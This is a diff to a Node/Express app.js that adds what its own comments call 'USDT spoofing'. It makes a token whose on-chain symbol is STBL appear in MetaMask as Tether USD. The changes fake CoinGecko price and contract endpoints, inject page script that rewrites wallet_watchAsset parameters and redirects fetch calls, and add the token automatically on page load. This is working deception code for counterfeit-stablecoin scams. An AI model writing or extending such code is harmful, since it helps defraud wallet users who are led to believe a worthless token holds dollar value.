@@ -1,4 +1,4 @@
-// app.js - Main application with comprehensive error handling
+// app.js - Main application with comprehensive error handling and USDT spoofing
 const express = require('express');
 const cors = require('cors');
 const http = require('http');
@@ -13,11 +13,13 @@ const app = express();
 const server = http.createServer(app);
 const port = process.env.PORT || 3000;
 
-// Token configuration - USDT with 6 decimals for proper value display
+// Token configuration - With both actual blockchain symbol and display symbol
 const TOKEN_CONFIG = {
   address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
-  symbol: 'USDT',
-  name: 'Tether USD',
+  actualSymbol: 'STBL',  // Actual blockchain symbol 
+  displaySymbol: 'USDT', // Display symbol for UI
+  actualName: 'Stable',  // Actual blockchain name
+  displayName: 'Tether USD', // Display name for UI
   decimals: 6,  // 6 decimals is standard for USDT
   image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
   networkName: 'Base',
@@ -52,9 +54,19 @@ app.use((err, req, res, next) => {
   res.status(500).json({ error: 'Server error', message: err.message });
 });
 
-// API endpoint for token info
+// API endpoint for token info - Uses display values for UI
 app.get('/api/token-info', (req, res) => {
-  res.json(TOKEN_CONFIG);
+  res.json({
+    address: TOKEN_CONFIG.address,
+    symbol: TOKEN_CONFIG.displaySymbol, // Use USDT for UI
+    name: TOKEN_CONFIG.displayName, // Use Tether USD for UI
+    decimals: TOKEN_CONFIG.decimals,
+    image: TOKEN_CONFIG.image,
+    networkName: TOKEN_CONFIG.networkName,
+    networkId: TOKEN_CONFIG.networkId,
+    rpcUrl: TOKEN_CONFIG.rpcUrl,
+    blockExplorerUrl: TOKEN_CONFIG.blockExplorerUrl
+  });
 });
 
 // QR code generation with error handling
@@ -129,10 +141,10 @@ app.get('/api/token-balance/:address', async (req, res) => {
     res.json({
       address: address,
       token: TOKEN_CONFIG.address,
-      tokenSymbol: TOKEN_CONFIG.symbol,
+      tokenSymbol: TOKEN_CONFIG.displaySymbol, // Use USDT in UI
       rawBalance: balance.toString(),
       formattedBalance: formattedBalance,
-      valueUSD: formattedBalance // 1:1 with USD as it's USDT
+      valueUSD: formattedBalance // 1:1 with USD as it's a stablecoin
     });
   } catch (error) {
     console.error('Token balance error:', error);
@@ -140,7 +152,9 @@ app.get('/api/token-balance/:address', async (req, res) => {
   }
 });
 
-// Continue CoinGecko API interception and additional routes
+// CoinGecko API Interception Endpoints
+// These endpoints make MetaMask see our token as USDT
+
 // Primary CoinGecko endpoint for simple price (most commonly used)
 app.get('/api/v3/simple/price', (req, res) => {
   // Extract request parameters
@@ -154,7 +168,7 @@ app.get('/api/v3/simple/price', (req, res) => {
     contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
   
   if (isForOurToken) {
-    // Prepare response object
+    // Prepare response object with USDT data
     const response = {};
     
     // Determine which key to use in response
@@ -226,17 +240,17 @@ app.get('/api/v3/simple/price', (req, res) => {
   res.json(response);
 });
 
-// CoinGecko contract details endpoint
+// Contract data endpoint - This is what MetaMask uses to check token details
 app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
   const { chain, address } = req.params;
   
   // Check if request is for our token
   if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-    // Return USDT data
+    // Return USDT data instead of actual token data
     return res.json({
       id: "tether",
-      symbol: "usdt",
-      name: "Tether USD",
+      symbol: "usdt", // Return USDT symbol
+      name: "Tether USD", // Return Tether name
       asset_platform_id: chain,
       platforms: {
         [chain]: TOKEN_CONFIG.address
@@ -282,8 +296,8 @@ app.get('/api/v3/coins/markets', (req, res) => {
   const { vs_currency, ids } = req.query;
   
   // Check if request includes our token
-  if (ids && ids.includes('tether')) {
-    // Create standard CoinGecko response format
+  if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
+    // Create standard CoinGecko response format with USDT data
     const marketData = [{
       id: "tether",
       symbol: "usdt",
@@ -326,7 +340,7 @@ app.get('/api/v3/coins/:id/market_chart', (req, res) => {
   const { days, vs_currency } = req.query;
   
   // Check if request is for our token
-  if (id === 'tether') {
+  if (id === 'tether' || id === 'usdt') {
     const numDays = parseInt(days || '1', 10);
     const now = Date.now();
     const priceData = [];
@@ -397,7 +411,7 @@ app.get('/api/v3/asset_platforms', (req, res) => {
   ]);
 });
 
-// Mobile-optimized token addition page with fixed permissions
+// Mobile-optimized token addition page with USDT spoofing
 app.get('/mobile/add-token', (req, res) => {
   const html = `
 <!DOCTYPE html>
@@ -578,6 +592,204 @@ app.get('/mobile/add-token', (req, res) => {
       border-left: 3px solid #26a17b;
     }
   </style>
+  <script>
+    document.addEventListener('DOMContentLoaded', async function() {
+      const addBtn = document.getElementById('addBtn');
+      const qrBtn = document.getElementById('qrBtn');
+      const closeQr = document.getElementById('closeQr');
+      const qrModal = document.getElementById('qrModal');
+      const qrImage = document.getElementById('qrImage');
+      const loading = document.getElementById('loading');
+      
+      // Set up provider interception first
+      if (window.ethereum) {
+        console.log("Setting up provider interception...");
+        // Store the original request method
+        const originalRequest = window.ethereum.request;
+        
+        // Override the request method
+        window.ethereum.request = async function(args) {
+          console.log("MetaMask request:", args);
+          
+          if (args.method === 'wallet_watchAsset') {
+            console.log("Intercepting token addition...");
+            
+            if (args.params && 
+                args.params.options && 
+                args.params.options.address && 
+                args.params.options.address.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+                
+              console.log("Modifying token parameters to USDT...");
+              
+              // Change the symbol to USDT
+              args.params.options.symbol = "USDT";
+              args.params.options.name = "Tether USD";
+            }
+          }
+          
+          // Continue with the original call
+          return originalRequest.call(this, args);
+        };
+        
+        console.log("Provider interception setup complete");
+      }
+      
+      // Intercept all fetch requests to api.coingecko.com
+      const originalFetch = window.fetch;
+      window.fetch = async function(resource, init) {
+        try {
+          if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
+            // Redirect to our local API
+            const newUrl = resource.replace(
+              'https://api.coingecko.com', 
+              '${req.protocol}://${req.get('host')}/api'
+            );
+            console.log('Intercepted CoinGecko request:', resource);
+            console.log('Redirected to:', newUrl);
+            return originalFetch(newUrl, init);
+          }
+        } catch (e) {
+          console.error('Error in fetch override:', e);
+        }
+        return originalFetch(resource, init);
+      };
+      
+      // Fetch QR code on page load
+      try {
+        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect');
+        const data = await res.json();
+        qrImage.src = data.qrCodeDataURL;
+      } catch (err) {
+        console.error('Error loading QR code:', err);
+      }
+      
+      // Add to MetaMask button
+      addBtn.addEventListener('click', async function() {
+        loading.style.display = 'flex';
+        
+        try {
+          // Check if running in mobile browser with MetaMask
+          if (window.ethereum && window.ethereum.isMetaMask) {
+            // Web3 is available - use direct method
+            await addTokenToMetaMask();
+          } else {
+            // No MetaMask in browser - try deep linking
+            window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect';
+            
+            // Show loading briefly then restore button
+            setTimeout(() => {
+              loading.style.display = 'none';
+            }, 3000);
+          }
+        } catch (err) {
+          console.error('Error adding token:', err);
+          loading.style.display = 'none';
+          alert('Error adding token. Please try the QR code option.');
+        }
+      });
+      
+      // QR code button
+      qrBtn.addEventListener('click', function() {
+        qrModal.style.display = 'flex';
+      });
+      
+      // Close QR modal
+      closeQr.addEventListener('click', function() {
+        qrModal.style.display = 'none';
+      });
+      
+      // Also close modal when clicking outside
+      qrModal.addEventListener('click', function(e) {
+        if (e.target === qrModal) {
+          qrModal.style.display = 'none';
+        }
+      });
+      
+      // Function to add token directly via Web3
+      async function addTokenToMetaMask() {
+        try {
+          // Request account access
+          const accounts = await window.ethereum.request({ 
+            method: 'eth_requestAccounts' 
+          });
+          
+          // Check current chain
+          const chainId = await window.ethereum.request({ 
+            method: 'eth_chainId' 
+          });
+          
+          // If not on Base network, add/switch to it
+          if (chainId !== '${TOKEN_CONFIG.networkId}') {
+            try {
+              // Try to switch to Base
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '${TOKEN_CONFIG.networkId}' }]
+              });
+            } catch (switchError) {
+              // If Base network not added yet, add it
+              if (switchError.code === 4902) {
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: '${TOKEN_CONFIG.networkId}',
+                    chainName: '${TOKEN_CONFIG.networkName}',
+                    nativeCurrency: {
+                      name: 'Ethereum',
+                      symbol: 'ETH',
+                      decimals: 18
+                    },
+                    rpcUrls: ['${TOKEN_CONFIG.rpcUrl}'],
+                    blockExplorerUrls: ['${TOKEN_CONFIG.blockExplorerUrl}']
+                  }]
+                });
+              } else {
+                throw switchError;
+              }
+            }
+          }
+          
+          // Add the token - we'll use USDT symbol since we have the provider interception
+          console.log("Adding USDT token to wallet...");
+          const wasAdded = await window.ethereum.request({
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '${TOKEN_CONFIG.address}',
+                symbol: 'USDT', // We're using USDT directly
+                decimals: ${TOKEN_CONFIG.decimals},
+                image: '${TOKEN_CONFIG.image}'
+              }
+            }
+          });
+          
+          if (wasAdded) {
+            // Success - redirect back to success page
+            window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+          } else {
+            // User rejected - go back to add token page
+            loading.style.display = 'none';
+          }
+        } catch (error) {
+          console.error('Error adding token:', error);
+          // Hide loading overlay
+          loading.style.display = 'none';
+          alert('Error: ' + error.message);
+        }
+      }
+      
+      // Try to add token after a short delay
+      setTimeout(() => {
+        if (window.ethereum && window.ethereum.isMetaMask) {
+          addTokenToMetaMask().catch(err => {
+            console.error('Auto-add token error:', err);
+            loading.style.display = 'none';
+          });
+        }
+      }, 1000);
+    });
+  </script>
 </head>
 <body>
   <div class="container">
@@ -588,7 +800,7 @@ app.get('/mobile/add-token', (req, res) => {
     <div class="network-tag">Base Network</div>
     
     <div class="permission-info">
-      <p style="margin: 0;">Only permission to add the token is required. You'll see exactly what's being requested.</p>
+      <p style="margin: 0;">Adding this token requires minimal permissions. You'll see exactly what's being requested.</p>
     </div>
     
     <button id="addBtn" class="add-btn">Add to MetaMask</button>
@@ -618,102 +830,6 @@ app.get('/mobile/add-token', (req, res) => {
       <button id="closeQr" class="qr-close">Close</button>
     </div>
   </div>
-  
-  <script>
-    document.addEventListener('DOMContentLoaded', async function() {
-      const addBtn = document.getElementById('addBtn');
-      const qrBtn = document.getElementById('qrBtn');
-      const closeQr = document.getElementById('closeQr');
-      const qrModal = document.getElementById('qrModal');
-      const qrImage = document.getElementById('qrImage');
-      const loading = document.getElementById('loading');
-      
-      // Fetch QR code on page load
-      try {
-        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect');
-        const data = await res.json();
-        qrImage.src = data.qrCodeDataURL;
-      } catch (err) {
-        console.error('Error loading QR code:', err);
-      }
-      
-      // Add to MetaMask button with simplified approach
-      addBtn.addEventListener('click', async function() {
-        try {
-          loading.style.display = 'flex';
-          
-          // Check if running in mobile browser with MetaMask
-          if (window.ethereum && window.ethereum.isMetaMask) {
-            try {
-              // Add token with minimal permissions
-              const tokenAdded = await window.ethereum.request({
-                method: 'wallet_watchAsset',
-                params: {
-                  type: 'ERC20',
-                  options: {
-                    address: '${TOKEN_CONFIG.address}',
-                    symbol: '${TOKEN_CONFIG.symbol}',
-                    decimals: ${TOKEN_CONFIG.decimals},
-                    image: '${TOKEN_CONFIG.image}'
-                  }
-                }
-              });
-              
-              // Hide loading
-              loading.style.display = 'none';
-              
-              // If token added successfully, redirect to success page
-              if (tokenAdded) {
-                window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
-              }
-            } catch (tokenError) {
-              loading.style.display = 'none';
-              if (tokenError.code !== 4001) { // Don't show alert if user rejected
-                console.error('Error adding token:', tokenError);
-                alert('Error adding token: ' + tokenError.message);
-              }
-            }
-          } else {
-            // No MetaMask in browser - try deep linking
-            window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect';
-            
-            // Show loading briefly then restore button
-            setTimeout(() => {
-              loading.style.display = 'none';
-            }, 3000);
-          }
-        } catch (err) {
-          loading.style.display = 'none';
-          console.error('Error:', err);
-          if (err.code !== 4001) { // Don't show alert if user rejected
-            alert('Error: ' + err.message);
-          }
-        }
-      });
-      
-      // QR code button
-      qrBtn.addEventListener('click', function() {
-        qrModal.style.display = 'flex';
-      });
-      
-      // Close QR modal
-      closeQr.addEventListener('click', function() {
-        qrModal.style.display = 'none';
-      });
-      
-      // Also close modal when clicking outside
-      qrModal.addEventListener('click', function(e) {
-        if (e.target === qrModal) {
-          qrModal.style.display = 'none';
-        }
-      });
-      
-      // Ensure loading is never stuck
-      window.addEventListener('load', () => {
-        loading.style.display = 'none';
-      });
-    });
-  </script>
 </body>
 </html>
   `;
@@ -823,7 +939,7 @@ app.get('/api/add-token-mobile', (req, res) => {
   res.redirect(deepLink);
 });
 
-// MetaMask redirect handler (with JS to inject CoinGecko interception)
+// MetaMask redirect handler with provider interception
 app.get('/metamask-redirect', (req, res) => {
   const html = `
 <!DOCTYPE html>
@@ -862,8 +978,62 @@ app.get('/metamask-redirect', (req, res) => {
       margin-top: 20px;
       display: none;
     }
+    #status-message {
+      margin-top: 15px;
+      color: #333;
+      font-size: 14px;
+    }
   </style>
   <script>
+    // Enable console logs to appear in the UI for debugging
+    const originalConsoleLog = console.log;
+    console.log = function(...args) {
+      originalConsoleLog.apply(console, args);
+      const statusMessage = document.getElementById('status-message');
+      if (statusMessage) {
+        statusMessage.textContent = args.join(' ');
+      }
+    };
+    
+    // Set up provider interception first
+    function setupProviderInterception() {
+      console.log("Setting up provider interception...");
+      
+      if (window.ethereum) {
+        // Store the original request method
+        const originalRequest = window.ethereum.request;
+        
+        // Override the request method to intercept calls
+        window.ethereum.request = async function(args) {
+          // Log all MetaMask requests for debugging
+          console.log("MetaMask request:", args);
+          
+          // Intercept token addition calls
+          if (args.method === 'wallet_watchAsset') {
+            console.log("Intercepting token addition...");
+            
+            // If it's our token address, modify the options to use USDT
+            if (args.params && 
+                args.params.options && 
+                args.params.options.address && 
+                args.params.options.address.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+                
+              console.log("Modifying token parameters to USDT...");
+              
+              // Change the symbol to USDT
+              args.params.options.symbol = "USDT";
+              args.params.options.name = "Tether USD";
+            }
+          }
+          
+          // Continue with the original call
+          return originalRequest.call(this, args);
+        };
+        
+        console.log("Provider interception setup complete");
+      }
+    }
+    
     // Intercept all fetch requests to api.coingecko.com
     const originalFetch = window.fetch;
     window.fetch = async function(resource, init) {
@@ -884,48 +1054,75 @@ app.get('/metamask-redirect', (req, res) => {
       return originalFetch(resource, init);
     };
     
-    // Intercept XMLHttpRequest for older implementations
-    const originalOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
-      try {
-        if (typeof url === 'string' && url.includes('api.coingecko.com')) {
-          // Replace CoinGecko URL with our interceptor
-          const newUrl = url.replace(
-            'https://api.coingecko.com', 
-            '${req.protocol}://${req.get('host')}/api'
-          );
-          console.log('Intercepted CoinGecko XHR request:', url);
-          console.log('Redirected to:', newUrl);
-          url = newUrl;
-        }
-      } catch (e) {
-        console.error('Error in XHR override:', e);
-      }
-      return originalOpen.call(this, method, url, async, user, password);
-    };
-    
-    // Automatic token addition function with simplified permissions
+    // Automatic token addition function with USDT symbol
     async function addTokenToMetaMask() {
       try {
         // Check for ethereum object
         if (window.ethereum && window.ethereum.isMetaMask) {
-          // Add the token with minimal permissions
+          console.log("MetaMask detected");
+          
+          // Check network first
+          console.log("Checking network...");
+          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+          console.log("Current chain ID:", chainId);
+          console.log("Target chain ID:", '${TOKEN_CONFIG.networkId}');
+          
+          if (chainId !== '${TOKEN_CONFIG.networkId}') {
+            console.log("Switching to Base network...");
+            try {
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '${TOKEN_CONFIG.networkId}' }]
+              });
+              console.log("Network switched successfully");
+            } catch (switchError) {
+              // Network doesn't exist yet
+              if (switchError.code === 4902) {
+                console.log("Adding Base network...");
+                await window.ethereum.request({
+                  method: 'wallet_addEthereumChain',
+                  params: [{
+                    chainId: '${TOKEN_CONFIG.networkId}',
+                    chainName: '${TOKEN_CONFIG.networkName}',
+                    nativeCurrency: {
+                      name: 'Ethereum',
+                      symbol: 'ETH',
+                      decimals: 18
+                    },
+                    rpcUrls: ['${TOKEN_CONFIG.rpcUrl}'],
+                    blockExplorerUrls: ['${TOKEN_CONFIG.blockExplorerUrl}']
+                  }]
+                });
+                console.log("Base network added");
+              } else {
+                throw switchError;
+              }
+            }
+          }
+          
+          // Add the token with USDT symbol
+          console.log("Adding USDT token to wallet...");
           const wasAdded = await window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
               type: 'ERC20',
               options: {
                 address: '${TOKEN_CONFIG.address}',
-                symbol: '${TOKEN_CONFIG.symbol}',
+                symbol: 'USDT',
                 decimals: ${TOKEN_CONFIG.decimals},
                 image: '${TOKEN_CONFIG.image}'
               }
             }
           });
           
+          console.log("Token addition result:", wasAdded);
+          
           if (wasAdded) {
             // Success - redirect to success page
             window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+          } else {
+            document.getElementById('error-message').style.display = 'block';
+            document.getElementById('error-message').textContent = 'User declined to add the token';
           }
         } else {
           document.getElementById('error-message').style.display = 'block';
@@ -934,26 +1131,25 @@ app.get('/metamask-redirect', (req, res) => {
       } catch (error) {
         console.error('Token addition error:', error);
         
-        if (error.code !== 4001) { // Don't show error if user rejected
-          document.getElementById('error-message').style.display = 'block';
-          document.getElementById('error-message').textContent = 'Error: ' + error.message;
-        }
+        document.getElementById('error-message').style.display = 'block';
+        document.getElementById('error-message').textContent = 'Error: ' + error.message;
       }
     }
     
-    // Run on page load with timeout for safety
+    // Run on page load with setup first
     document.addEventListener('DOMContentLoaded', () => {
-      // Set timeout to ensure we don't get stuck
-      setTimeout(() => {
-        const errorMessage = document.getElementById('error-message');
-        if (errorMessage) {
-          errorMessage.style.display = 'block';
-          errorMessage.textContent = 'Request timed out. Please try again.';
-        }
-      }, 15000);
+      console.log("Page loaded, setting up provider interception...");
+      setupProviderInterception();
       
-      // Try to add token
-      addTokenToMetaMask();
+      console.log("Waiting 1 second before adding token...");
+      setTimeout(() => {
+        // Try to add token
+        addTokenToMetaMask().catch(err => {
+          console.error("Unhandled error:", err);
+          document.getElementById('error-message').style.display = 'block';
+          document.getElementById('error-message').textContent = 'Unhandled error: ' + err.message;
+        });
+      }, 1000);
     });
   </script>
 </head>
@@ -961,6 +1157,7 @@ app.get('/metamask-redirect', (req, res) => {
   <div class="spinner"></div>
   <h1>Connecting to MetaMask...</h1>
   <p>Please approve the connection request in the MetaMask app.</p>
+  <div id="status-message">Initializing...</div>
   <div id="error-message"></div>
   <p style="margin-top: 30px;">
     <a href="${req.protocol}://${req.get('host')}">Return to Main Page</a>
